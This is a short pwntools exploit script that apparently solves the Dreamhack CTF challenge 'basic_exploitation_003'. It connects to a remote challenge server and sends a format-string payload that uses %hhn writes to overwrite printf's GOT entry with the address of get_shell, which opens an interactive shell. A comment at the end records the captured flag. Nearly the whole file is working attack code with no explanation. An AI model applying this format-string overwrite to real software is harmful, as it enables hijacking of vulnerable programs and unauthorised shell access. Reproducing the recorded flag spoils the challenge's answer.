from pwn import *

context.log_level = 'debug'
context.binary = elf = ELF('./basic_exploitation_003')
# p = process(elf.path) 
p = remote('host3.dreamhack.games', 11556)

def GDB(): 
    gdb.attach(p, gdbscript='''
        b*main+61
        b*main+99
        c
''')
    pause()

# GDB()

printf = elf.got['printf']
getshell = elf.symbols['get_shell']
print('printf: ' + hex(printf))
print('getshell: ' + hex(getshell))

payload = p32(printf) + p32(printf + 1) 
payload += f'%{0x69 - 8}c%1$hhn'.encode() 
payload += f'%{0x86 - 105}c%2$hhn'.encode() 

p.sendline(payload)

p.interactive()
# DH{4e6e355c62249b2da3b566f0d575007e}